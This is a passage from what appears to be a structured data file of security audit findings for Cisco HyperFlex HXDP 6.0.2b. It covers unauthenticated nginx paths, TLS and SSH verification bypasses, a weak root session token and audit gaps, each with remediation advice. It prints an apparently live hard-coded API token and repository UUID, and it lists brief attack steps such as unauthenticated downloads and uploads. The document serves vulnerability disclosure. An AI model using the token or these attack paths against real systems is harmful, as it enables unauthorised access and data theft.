        "(2) read the encryption key from `/stSSOMgr/keyData`; "
        "(3) decrypt the credentials offline. "
        "This pattern — storing key and ciphertext together — voids all encryption "
        "guarantees regardless of the encryption algorithm used."
    ),
    "evidence": [
        "stSSOMgr-1.0/conf/application.conf:10: zkBasePath = '/stSSOMgr'",
        "stSSOMgr-1.0/conf/application.conf:11: zkAuthKey = '/auth'",
        "stSSOMgr-1.0/conf/application.conf:12: zkCredsKey = 'creds'",
        "stSSOMgr-1.0/conf/application.conf:13: zkEncryptionKey = 'keyData'",
        "stSSOMgr-1.0.jar: getEncryptionKeyFromZK (method confirmed in JAR)",
        "stSSOMgr-1.0.jar: setHypervHostCreds (method confirmed in JAR)",
        "ZK read: /stSSOMgr/keyData = encryption key; /stSSOMgr/creds = encrypted HyperV/ESX credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Never store the encryption key and encrypted data in the same storage system. "
        "Hypervisor credentials should be stored in a dedicated secrets manager (Vault, "
        "KMIP server) that is independent of ZooKeeper. "
        "The encryption key should be hardware-protected (TPM, HSM) or derived from a "
        "root secret that is not accessible to the same threat actor who can read ZK. "
        "At minimum, restrict ZK ACLs on `/stSSOMgr/` subtree to the SSO manager "
        "service account only."
    ),
    "tags": ["zookeeper", "hypervisor-creds", "key-colocation", "cwe-312", "critical"],
}

HX_F187 = {
    "id": "HX-F187",
    "title": "Password Sync Service Propagates root/admin/diag Credentials Across Cluster",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cwe": "CWE-522",
    "component": "storfs-mgmt/hxSupportSvc-1.0/conf/application.conf",
    "description": (
        "hxSupportSvc-1.0/conf/application.conf enables `passwordSyncEnabled = true` "
        "for `passwordSyncAccounts = ['root', 'admin', 'diag']`. "
        "This means the support service actively synchronizes the operating system "
        "passwords for the three highest-privilege accounts (root, admin, diag) across "
        "all cluster nodes via the management network. "
        "The synchronization mechanism uses SSH (confirmed by `SshScpUtil$sshCred` class "
        "in the JAR and `sshScpRetries = 3` config). "
        "This design creates a flat credential model: compromising the OS password on "
        "any single cluster node recovers credentials for root, admin, and diag on "
        "every other node, because they are forced to be identical. "
        "Additionally, the password hash or plaintext must be transmitted during sync; "
        "combined with the systemic TLS bypass (HX-F157/HX-F165), the credential "
        "transmission is susceptible to interception. "
        "The `diag` user is barred from JWT auth (`barredUsers` in application.conf) "
        "but may have shell/SSH access on all nodes via password sync."
    ),
    "evidence": [
        "hxSupportSvc-1.0/conf/application.conf:8: passwordSyncEnabled = true",
        "hxSupportSvc-1.0/conf/application.conf:9: passwordSyncAccounts = ['root', 'admin', 'diag']",
        "hxSupportSvc-1.0.jar: HxSupportSvcImpl$sshCred class (SSH credential model)",
        "hxSupportSvc-1.0.jar: SshScpUtil$sshCred (SSH-based sync mechanism)",
        "auth-war application.conf:42: barredUsers = ['root', 'local/root', 'diag', 'local/diag']",
        "Compromise of any node root/admin/diag -> same creds on all cluster nodes",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Disable password synchronization (`passwordSyncEnabled = false`) and manage "
        "node credentials independently with unique per-node passwords. "
        "If cross-node authentication is required, use SSH key distribution with "
        "unique per-node key pairs rather than shared passwords. "
        "Remove `root` and `admin` from the sync list immediately; synchronizing "
        "these accounts creates a cluster-wide single point of credential failure."
    ),
    "tags": ["password-sync", "lateral-movement", "root", "cwe-522", "high"],
}

HX_F188 = {
    "id": "HX-F188",
    "title": "Unauthenticated Access to Web Access Logs via /logs nginx Path",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the `/logs` path to `/var/www/localhost/logs` without "
        "authentication: `auth_basic off; allow all; alias /var/www/localhost/logs`. "
        "HTTP access logs for the management web interface are readable by any "
        "unauthenticated remote client. "
        "Access logs record: API endpoint paths (/coreapi/v1/clusters/, "
        "/rest/v1/clusters/, etc.), client IP addresses, HTTP methods, response "
        "codes, and response sizes. Depending on the nginx log_format configuration, "
        "these logs may also include: request headers (Authorization, X-RootSessionID), "
        "query strings containing sensitive parameters, and user agent strings. "
        "Because `auditHttpVerbsToSkip = ['GET']` (HX-F178) means GET operations "
        "are not audited by the management application, the nginx access log may be "
        "the only record of read operations — and it is accessible without credentials. "
        "Logs are accessible at `http://<ctlvm>/logs/<logfilename>` — log filenames "
        "are typically predictable (access.log, access.log.1, etc.)."
    ),
    "evidence": [
        "nginx.conf: location /logs { auth_basic off; allow all; alias /var/www/localhost/logs; }",
        "auth-war application.conf:49: auditHttpVerbsToSkip = ['GET'] (GET audit gap HX-F178)",
        "HTTP access logs may contain Authorization bearer tokens and X-RootSessionID values",
        "Attack: GET http://<ctlvm>/logs/access.log -> API call history without credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict access to `/logs` using `auth_basic` with proper credentials, or "
        "`allow 127.0.0.1; deny all` to limit to localhost-only access. "
        "Review the nginx `log_format` to ensure token values and sensitive headers "
        "are not logged. "
        "If external log access is required, serve logs via an authenticated endpoint."
    ),
    "tags": ["log-access", "auth-bypass", "nginx", "cwe-284", "medium"],
}

HX_F189 = {
    "id": "HX-F189",
    "title": "Unauthenticated File Upload to Management Backend via /upload nginx Path",
    "severity": "HIGH",
    "cvss": 8.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-434",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf proxies the `/upload` path to `http://localhost:8000` without "
        "authentication: `auth_basic off; allow all; proxy_pass http://localhost:8000`. "
        "The HyperFlex management backend at localhost:8000 handles `/upload` requests "
        "without any authentication gating at the nginx layer. "
        "If the `/upload` handler on port 8000 accepts arbitrary file content without "
        "server-side validation, this allows an unauthenticated attacker to: "
        "(1) upload malicious firmware packages during cluster upgrade operations; "
        "(2) upload crafted configuration files to overwrite cluster settings; "
        "(3) trigger path traversal if the upload handler constructs file paths "
        "from client-supplied filenames without normalization. "
        "The nginx configuration explicitly allows `client_max_body_size 8000m` (8GB), "
        "indicating the upload handler is designed for large firmware/OVA files. "
        "The upgrade-war and enc-war web applications also expose `/upload` via their "
        "servlet configurations, confirming this path reaches the upgrade pipeline."
    ),
    "evidence": [
        "nginx.conf: location /upload { auth_basic off; allow all; proxy_pass http://localhost:8000; }",
        "nginx.conf: client_max_body_size 8000m  (8GB upload limit suggests firmware/OVA use case)",
        "upgrade-war/WEB-INF/web.xml: jersey servlet covers /v1/* including upload paths",
        "Attack surface: POST http://<ctlvm>/upload + any file content = unauthenticated upload to mgmt backend",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Add authentication to the `/upload` nginx location — at minimum, require a "
        "valid JWT token in the Authorization header before proxying to localhost:8000. "
        "The backend handler at `/upload` must independently validate the caller's "
        "authorization, file content type (magic bytes, not extension), and file path "
        "to prevent directory traversal. "
        "Restrict upload operations to management sessions using the AAA service."
    ),
    "tags": ["file-upload", "auth-bypass", "nginx", "rce-surface", "cwe-434", "high"],
}

HX_F190 = {
    "id": "HX-F190",
    "title": "Unauthenticated Access to Support Bundle Directory via /support nginx Path",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps `/support` to `/var/support/` without authentication: "
        "`auth_basic off; allow all; alias /var/support/`. "
        "HyperFlex support bundles are stored in `/var/support/` and contain: "
        "cluster configuration data, network topology, node inventory, log files "
        "(including the API access logs from `/var/www/localhost/logs/`), "
        "and potentially configuration files with sensitive data. "
        "Support bundles are automatically generated during diagnostics and "
        "upgrade operations. An attacker can download the full support bundle "
        "at `http://<ctlvm>/support/<bundle_filename>` without credentials. "
        "Support bundle filenames are typically timestamped and predictable in format. "
        "Chain with HX-F178 (GET audit gap): the download leaves no audit trail."
    ),
    "evidence": [
        "nginx.conf: location /support { auth_basic off; allow all; alias /var/support/; }",
        "Support bundles contain cluster config, logs, and node inventory",
        "Attack: GET http://<ctlvm>/support/<bundle>.tar.gz -> full diagnostic data exfil",
        "Chain: HX-F190 + HX-F178 (no audit) = undetected exfil of cluster intelligence",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict the `/support` path with `auth_basic` authentication requiring valid "
        "credentials before serving support bundle files. "
        "Alternatively, restrict to localhost: `allow 127.0.0.1; deny all`. "
        "If remote support access is needed, use the authenticated `/storfs-support` "
        "path (which does have auth_basic enabled) instead of `/support`."
    ),
    "tags": ["support-bundle", "auth-bypass", "nginx", "data-exfil", "cwe-284", "high"],
}

HX_F191 = {
    "id": "HX-F191",
    "title": "changepasswd.sh Passes Credentials as Process Arguments and Suppresses All passwd Errors",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "mgmt/opt/hyperflex/changepasswd.sh",
    "description": (
        "changepasswd.sh receives the old password as `$2` and new password as `$3` "
        "(positional shell arguments). Both values are visible in the process argument list "
        "for the duration of script execution. A local attacker can read them via `/proc/<pid>/cmdline` "
        "or `ps auxww` during the execution window. "
        "A second defect compounds this: the script unconditionally executes `exit 0` after the "
        "`passwd` heredoc invocation regardless of passwd's return code. "
        "If `passwd` fails (wrong current password, password complexity violation, "
        "PAM module rejection), the Scala caller receives a zero exit status and treats "
        "the password change as successful. The actual password is not changed, but the "
        "cluster's state machine advances as if it were — creating a silent inconsistency "
        "where credentials are in an unknown state. "
        "The script comment explicitly acknowledges this: "
        "`# Supress passwd return codes here, otherwise scala will complain`."
    ),
    "evidence": [
        "changepasswd.sh line 2-5: user=${1}, old_pass=${2}, pass=${3} — positional args",
        "changepasswd.sh line 17-18: `# Supress passwd return codes here` followed by `exit 0`",
        "Old and new passwords are visible via /proc/<pid>/cmdline while the script runs",
        "A failed passwd invocation returns success to the Scala layer, masking auth inconsistency",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass passwords via stdin or a file descriptor rather than positional arguments. "
        "Remove the unconditional `exit 0` and propagate `passwd`'s actual return code: "
        "capture the return code with `RESULT=$?` and `exit $RESULT`. "
        "The Scala caller must be updated to handle non-zero exit codes from password changes."
    ),
    "tags": ["credentials-in-args", "process-exposure", "cwe-214", "cwe-390", "medium"],
}

HX_F192 = {
    "id": "HX-F192",
    "title": "gen-self-signed-cert.sh Hardcodes commonName=hyperflex Across All Cluster Nodes",
    "severity": "LOW",
    "cvss": 3.7,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "cwe": "CWE-297",
    "component": "storfs-misc/gen-self-signed-cert.sh",
    "description": (
        "gen-self-signed-cert.sh generates the nginx TLS certificate with a hardcoded "
        "`commonName=hyperflex` regardless of the actual node hostname or IP. "
        "Every controller VM in the cluster receives a certificate with the identical CN. "
        "The script does correctly populate `subjectAltName = DNS:${DOMAIN}` (the SAN), "
        "but CN and SAN mismatches cause TLS validation failures in clients that check CN "
        "rather than only SANs. The companion script `gen-self-signed-cert_ui.sh` "
        "correctly uses `commonName=${DOMAIN}`. "
        "The generated certificates have 5-year validity (`-days 1825`), "
        "extending the window during which a compromised certificate remains exploitable. "
        "With the systemic `verify=False` / `ssl._create_unverified_context` pattern "
        "present throughout HyperFlex management scripts (HX-F168), this CN defect is "
        "never caught at runtime — both defects reinforce each other."
    ),
    "evidence": [
        "gen-self-signed-cert.sh line 16: commonName=hyperflex (hardcoded)",
        "gen-self-signed-cert.sh line 21: -days 1825 (5-year validity)",
        "gen-self-signed-cert_ui.sh uses commonName=${DOMAIN} (correct behavior)",
        "Every ctlvm generates identical CN; inter-node TLS identity not verifiable by CN",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change `commonName=hyperflex` to `commonName=${DOMAIN}` in gen-self-signed-cert.sh, "
        "aligning it with the ui variant. "
        "Reduce certificate validity from 1825 days to 365 days (or 90 days) "
        "and implement certificate rotation automation. "
        "Remediation of CWE-297 is only complete when the systemic TLS bypass (HX-F168) "
        "is also addressed."
    ),
    "tags": ["tls", "certificate", "hardcoded-cn", "cwe-297", "low"],
}

HX_F193 = {
    "id": "HX-F193",
    "title": "node_replace.py Globally Overrides ssl._create_default_https_context at Module Import",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc/hx-scripts/node_replace.py",
    "description": (
        "node_replace.py lines 37-44 override Python's default HTTPS context at module load: "
        "`ssl._create_default_https_context = ssl._create_unverified_context`. "
        "This is more severe than per-request `verify=False` (HX-F168): it globally disables "
        "TLS certificate verification for all HTTPS connections opened by this process, "
        "including any library or dependency that uses the default context. "
        "The script is responsible for node replacement operations — it connects to "
        "vCenter, cluster management IPs, ESX hosts, and remote controller VMs. "
        "Under this override, an on-path attacker can present any certificate and intercept "
        "credentials, commands, and cluster configuration data on all of these connections. "
        "The comment `# Handle target environment that doesn't support HTTPS verification` "
        "indicates this was intentionally introduced as an environment workaround, "
        "not detected and reverted."
    ),
    "evidence": [
        "node_replace.py line 37: _create_unverified_https_context = ssl._create_unverified_context",
        "node_replace.py line 44: ssl._create_default_https_context = _create_unverified_https_context",
        "Global override affects all HTTPS calls: checkLogin, getAbout, getControllers, clusterRefresh, getClusterDetails",
        "Comment: '# Handle target environment that doesn't support HTTPS verification'",
        "Script connects to vCenter (port 443), cluster management, ESX hosts, remote ctlvms",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the global ssl._create_default_https_context override. "
        "Install valid cluster CA certificates and configure requests with `verify=/path/to/ca.crt`. "
        "If self-signed certificates are in use, generate them with correct hostnames (see HX-F192) "
        "and distribute the CA to management scripts rather than bypassing verification."
    ),
    "tags": ["tls", "ssl-bypass", "global-override", "cwe-295", "high"],
}

HX_F194 = {
    "id": "HX-F194",
    "title": "SSH Host Key Verification Disabled via AutoAddPolicy in Node Management Scripts",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc/hx-scripts/node_replace.py, hx-scripts/install_vc_plugin.py",
    "description": (
        "Both node_replace.py and install_vc_plugin.py create paramiko SSH clients with "
        "`set_missing_host_key_policy(paramiko.AutoAddPolicy())`, silently accepting any "
        "host key on first connection without validation. "
        "node_replace.py uses this pattern at three call sites: "
        "`check_connection()` (line 237), `sshToHost()` (line 324), and inline at line 666. "
        "install_vc_plugin.py uses it in `check_connection()` (line 348) and `copy_file()` (line 355). "
        "The affected operations include: "
        "(1) root SSH access to cluster controller VMs during node replacement, "
        "(2) root SSH access to ESX hypervisor hosts, "
        "(3) SFTP transfer of the vCenter plugin ZIP to all cluster nodes as root. "
        "Under AutoAddPolicy, an on-path attacker can present a forged host key, "
        "intercept the root password, and receive the plugin ZIP — which is then deployed "
        "cluster-wide. Combined with the global TLS bypass (HX-F193), no SSH or HTTPS "
        "connection from these management scripts verifies peer identity."
    ),
    "evidence": [
        "node_replace.py line 237: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "node_replace.py line 324: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "node_replace.py line 666: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "install_vc_plugin.py line 348: ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "install_vc_plugin.py line 482: copy_file() uses SFTP as root to all cluster nodes",
        "Root credentials and plugin packages transmitted over unverified SSH sessions",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy with RejectPolicy or WarningPolicy. "
        "Pre-populate known_hosts with cluster node fingerprints during cluster setup. "
        "For SFTP plugin distribution, use an authenticated internal package repository "
        "over HTTPS rather than SCP/SFTP with ad-hoc host key acceptance."
    ),
    "tags": ["ssh", "host-key", "mitm", "cwe-295", "paramiko", "high"],
}

HX_F195 = {
    "id": "HX-F195",
    "title": "support.py Hard-codes Bearer Token and Repository UUID for Cisco upload.hyperflex.io",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    "cwe": "CWE-798",
    "component": "storfs-misc/hx-scripts/support.py",
    "description": (
        "support.py lines 317-319 embed a hard-coded API bearer token and repository UUID "
        "for Cisco's external support upload service upload.hyperflex.io: "
        "`token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'` and "
        "`url = 'https://upload.hyperflex.io/admin/api2/repos/be407e72-bbcb-41a7-bd0c-2fbdd3abfa74/...'`. "
        "The token is sent as `Authorization: Token d5c08af6de7b6c8f732fd1f25ff54fa84d7beede` "
        "in all interactions with the service: ping, folder creation, and bundle upload. "
        "Anyone with access to the firmware image can extract these credentials and "
        "authenticate to Cisco's upload.hyperflex.io infrastructure, potentially: "
        "(1) reading or listing other customers' uploaded support bundles in the same repo, "
        "(2) uploading malicious files to the shared repository, "
        "(3) enumerating the upload service's directory structure. "
        "The token is static across all HyperFlex deployments running this firmware version. "
        "A separate fallback in `verifyConnectivity()` appends a hardcoded IP `38.140.50.205` "
        "for `upload.hyperflex.io` to `/etc/hosts` when DNS fails, "
        "then connects to that IP with `verify=False` — a TOFU write to the hosts file "
        "that persists until `cleanup()` runs at process exit."
    ),
    "evidence": [
        "support.py line 317: token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede' (hardcoded)",
        "support.py line 319: url includes repo UUID 'be407e72-bbcb-41a7-bd0c-2fbdd3abfa74' (hardcoded)",
        "support.py line 304: entry = '38.140.50.205\\t upload.hyperflex.io' written to /etc/hosts on DNS failure",
        "Token used for createFolder(), uploadSupportBundle(), verifyConnectvity()",
        "All HTTPS calls to upload.hyperflex.io use verify=False — server identity unverified",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace the hard-coded token with a per-deployment credential provisioned at cluster "
        "setup time and stored in a secrets manager or protected file (not source code). "
        "Rotate the hard-coded token immediately as it is embedded in shipped firmware. "
        "The fallback hosts-file write should be removed; DNS failure should surface as "
        "a hard error rather than a TOFU IP insertion."
    ),
    "tags": ["hardcoded-credential", "external-service", "cwe-798", "api-token", "high"],
}

HX_F196 = {
    "id": "HX-F196",
    "title": "STIG Tool Skips ESXiVPsDisabledProtocols: SSLv3/TLSv1.0/TLSv1.1 Left Enabled on ESXi Hosts",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-327",
    "component": "storfs-misc/hx-scripts/stig_security_settings_hx.py, stig_config.ini",
    "description": (
        "stig_security_settings_hx.py line 192 comments out the "
        "`UserVars.ESXiVPsDisabledProtocols` setting: "
        "`# 'UserVars.ESXiVPsDisabledProtocols': str(getValue('esxi', 'ESXiVPsDisabledProtocols'))`. "
        "The corresponding `stig_config.ini` line is also commented out: "
        "`#ESXiVPsDisabledProtocols:sslv3,tlsv1,tlsv1.1`. "
        "DISA ESXi STIG (ESXI-67-000030, ESXI-70-000085) requires that SSLv3, TLSv1.0, "
        "and TLSv1.1 be disabled on all ESXi hosts. "
        "When HyperFlex applies STIG hardening via `stig_security_settings_hx.py`, "
        "these protocols remain enabled because the setting is never pushed to ESXi. "
        "A cluster that has undergone STIG hardening is left believing it is compliant "
        "while ESXi hosts still accept SSLv3 and TLS 1.0 connections. "
        "POODLE (CVE-2014-3566) and BEAST attacks apply to SSLv3/TLS 1.0 sessions. "
        "The comment in the source suggests intentional omission — possibly a compatibility "
        "decision — rather than an oversight, meaning it survived code review."
    ),
    "evidence": [
        "stig_security_settings_hx.py line 192: # 'UserVars.ESXiVPsDisabledProtocols': ... (commented out)",
        "stig_config.ini: #ESXiVPsDisabledProtocols:sslv3,tlsv1,tlsv1.1 (commented out)",
        "All other STIG settings in the [esxi] section are applied; this one is selectively skipped",
        "DISA STIG ESXI-67-000030 / ESXI-70-000085 require disabling SSLv3/TLSv1.0/TLSv1.1",
        "SSLv3 vulnerable to POODLE (CVE-2014-3566); TLS 1.0 vulnerable to BEAST",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Uncomment `ESXiVPsDisabledProtocols:sslv3,tlsv1,tlsv1.1` in `stig_config.ini` "
        "and uncomment the corresponding `UserVars.ESXiVPsDisabledProtocols` line "
        "in `stig_security_settings_hx.py`. "
        "Verify that all ESXi hosts reject SSLv3, TLSv1.0, and TLSv1.1 handshakes "
        "after STIG hardening completes. "
        "Update the STIG compliance report to accurately reflect the actual protocol "
        "configuration rather than the intended configuration."
    ),
    "tags": ["tls", "stig", "legacy-protocol", "cwe-327", "esxi", "medium"],
}

HX_F197 = {
    "id": "HX-F197",
    "title": "Root Session Token Generated with 15-bit Entropy ($RANDOM) and Stored World-Readable",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-330",
    "component": "storfs-misc/set_shared_key.sh",
    "description": (
        "set_shared_key.sh generates the `X-RootSessionID` authentication token used by "
        "stSSOMgr and all `useRootSessionId=True` API callers: "
        "`sharedkey=$nodeid-$RANDOM` where `nodeid` is read from "
        "`/opt/hyperflex/etc/product_uuid`. "
        "Bash `$RANDOM` generates integers in [0, 32767] — 15 bits of entropy, "
        "32,768 possible values total. The `product_uuid` is the VMware VM UUID, "
        "readable from BIOS data (`dmidecode -s system-uuid`) by any local user. "
        "An attacker with the product UUID can enumerate the full keyspace in under "
        "one second and obtain a valid `X-RootSessionID` token. "
        "The generated file is then made world-readable: `chmod 644 root_file.pub`. "
        "Any local user can read the token directly without brute-force. "
        "The token is placed at `/etc/root_file.pub` before `migrate-secureconfig.sh` "
        "moves it to `/etc/hyperflex/secure/root_file.pub`, meaning it is world-readable "
        "in `/etc/` first and potentially in the secure directory as well. "
        "The token is used with `X-RootSessionID` header in HTTP requests to the "
        "management API at `http://localhost:8000` — bypassing normal JWT authentication "
        "for certificate management, inventory, STIG settings, and cluster lifecycle "
        "operations. Affected callers: `nginxCertManager.py`, `synchronizeSyslog.py`, "
        "`schScripts.py`, `SLEvaluationJob.py`, `update-inventory.py`, `hsu_utils.py`, "
        "upgrade hook `5997_stig_setting_ESX.py`."
    ),
    "evidence": [
        "set_shared_key.sh line 11: sharedkey=$nodeid-$RANDOM (15-bit entropy)",
        "set_shared_key.sh line 13: chmod 644 $dest_folder/root_file.pub (world-readable)",
        "nodeid = product_uuid read from /opt/hyperflex/etc/product_uuid (VM UUID, derivable from dmidecode)",
        "StTransportBase.py line 26: X-RootSessionID loaded from /etc/hyperflex/secure/root_file.pub",
        "commonFunctions.py line 42: headers['X-RootSessionID'] = rootSessionId",
        "Token bypasses JWT auth for certificate, STIG, inventory, and cluster lifecycle APIs",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `$RANDOM` with a cryptographically secure random generator: "
        "`sharedkey=$(openssl rand -hex 32)`. "
        "Change the file permissions to 600 (root-only): `chmod 600 root_file.pub`. "
        "Ensure the migration script preserves restrictive permissions when moving the file "
        "to `/etc/hyperflex/secure/`. "
        "Consider replacing the file-based `X-RootSessionID` scheme with a time-limited "
        "token issued by the AAA service, eliminating the static shared secret entirely."
    ),
    "tags": ["weak-random", "world-readable-token", "authentication-bypass", "cwe-330", "cwe-732", "critical"],
}

HX_F198 = {
    "id": "HX-F198",
    "title": "On-Prem Artifact Downloads Bypass TLS and Verify Checksum Over Same Untrusted Channel",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
    "cwe": "CWE-354",
    "component": "storfs-deploy/ansible/roles/download/tasks/download-artifacts.yml",
    "description": (
        "download-artifacts.yml conditionally disables TLS verification for on-premises "
        "deployments: `Disable certificate verification for onprem deployment: set_fact: "
        "check_certs: no when: deployment_env == 'onprem'`. "
        "Both the artifact (`artifactUrl`) and its checksum (`checksumUrl`) are fetched "
        "with `validate_certs: '{{ check_certs }}'`. "
        "When `check_certs: no`, both the artifact and its integrity checksum are "
        "retrieved over the same MITM-susceptible channel. "
        "An on-path attacker can serve a trojanized artifact alongside a matching "
        "checksum file — the `get_url` `checksum:` parameter will verify that the "
        "artifact matches the attacker-provided checksum, confirming successful "
        "substitution rather than detecting it. "
        "This defeats the integrity verification entirely: the checksum confirms "
        "consistency between attacker-controlled data, not authenticity. "
        "The download role installs VIBs, packages, and catalog artifacts on all "
        "cluster ESX hosts. Successful MITM during on-prem deployment yields "
        "code execution on every node that processes the download role."
    ),
    "evidence": [
        "download-artifacts.yml: set_fact check_certs: no when: deployment_env == 'onprem'",
        "download-artifacts-internal.yml: get_url url={{ item.checksumUrl }} validate_certs={{ check_certs }}",
        "download-artifacts-internal.yml: get_url url={{ item.artifactUrl }} validate_certs={{ check_certs }} checksum={{ checksumType }}:{{ checksum_value.stdout }}",
        "Checksum fetched from same unverified TLS endpoint as artifact — MITM serves matching pair",
        "Artifacts installed as VIBs/packages on all cluster ESX hosts via download role",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the on-prem TLS bypass (`check_certs: no`). "
        "If on-prem environments lack externally-trusted CAs, distribute the HyperFlex "
        "cluster CA certificate to the ansible control node and configure `validate_certs: yes` "
        "with `ca_cert: /path/to/ca.crt`. "
        "The checksum file should be served from a separate, independently-authenticated "
        "channel (or signed with a known public key) rather than from the same download server. "
        "A signature verification step (GPG detached sig) after download provides stronger "
        "integrity than same-channel checksum alone."
    ),
    "tags": ["tls", "artifact-download", "checksum-bypass", "cwe-354", "ansible", "high"],
}

HX_F199 = {
    "id": "HX-F199",
    "title": "GET Requests Excluded From Audit Logging — Unauthenticated Read Operations Leave No Trail",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-778",
    "component": "authfilter/application.conf / auditHttpVerbsToSkip",
    "description": (
        "authfilter/application.conf sets `auditHttpVerbsToSkip = [\"GET\"]`, "
        "which instructs the HyperFlex authentication filter to skip audit "
        "log generation for all HTTP GET requests. "
        "The HyperFlex management REST API exposes cluster topology, datastore "
        "contents, VM inventory, network configuration, and credentials via "
        "read-only GET endpoints. "
        "An authenticated attacker (or any user with a valid session) can "
        "enumerate and exfiltrate all cluster data using GET requests without "
        "generating a single audit event. "
        "GET-based exfiltration (inventory enumeration, credential scraping via "
        "GET /coreapi/v1/config, datastore listing) is the standard low-noise "
        "reconnaissance path — excluding it from audit renders the audit log "
        "useless for detecting insider threats and post-compromise enumeration. "
        "The upgrade-war component carries the same setting, extending the "
        "coverage gap to the upgrade API surface."
    ),
    "evidence": [
        "authfilter/application.conf line 43: auditHttpVerbsToSkip = [\"GET\"]",
        "upgrade-war/WEB-INF/classes/application.conf line 43: auditHttpVerbsToSkip = [\"GET\"]",
        "Same configuration present in both main auth filter and upgrade-war — not an oversight in one component",
        "HX REST API exposes cluster data, credentials, and config via GET endpoints",
        "No audit event generated for GET /coreapi/v1/*, /rest/*, /upgrade/* read operations",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove GET from auditHttpVerbsToSkip or scope the exclusion to "
        "high-volume benign paths (health checks, metrics polls) by URI "
        "rather than HTTP verb. "
        "Security-sensitive GET endpoints (credential reads, cluster config "
        "retrieval, user enumeration) must generate audit events regardless "
        "of HTTP verb. "
        "Consider differential audit tiers: suppress noisy polling GET paths "
        "while retaining audit on data-bearing GET paths."
    ),
    "tags": ["audit", "logging", "cwe-778", "get", "exfiltration", "medium"],
}

HX_F200 = {
    "id": "HX-F200",
    "title": "Divergent barredUsers Policy Allows diag Account Through Upgrade-War Auth Filter",
    "severity": "HIGH",
    "cvss": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-863",
    "component": "authfilter/application.conf vs upgrade-war/WEB-INF/classes/application.conf",
    "description": (
        "The HyperFlex authentication filter and the upgrade-war component "
        "each carry their own `barredUsers` list that blocks specific privileged "
        "accounts from authenticating. "
        "authfilter/application.conf: `barredUsers = [\"root\", \"local/root\", \"diag\", \"local/diag\"]`. "
        "upgrade-war/WEB-INF/classes/application.conf: `barredUsers = [\"root\", \"local/root\"]`. "
        "The `diag` and `local/diag` accounts are explicitly blocked by the main "
        "authentication filter but are absent from the upgrade-war barred list. "
        "`diag` is a privileged diagnostic account present on all HyperFlex nodes. "
        "An actor with diag credentials can authenticate via the upgrade API surface "
        "(/upgrade/*, /rest/about, upgrade-war-hosted endpoints) even while the "
        "main cluster API correctly rejects the same credentials. "
        "The security policy intent is to bar diag from all authenticated access; "
        "the implementation inconsistency creates a functional bypass limited to "
        "the upgrade-war service."
    ),
    "evidence": [
        "authfilter/application.conf line 42: barredUsers = [\"root\", \"local/root\", \"diag\", \"local/diag\"]",
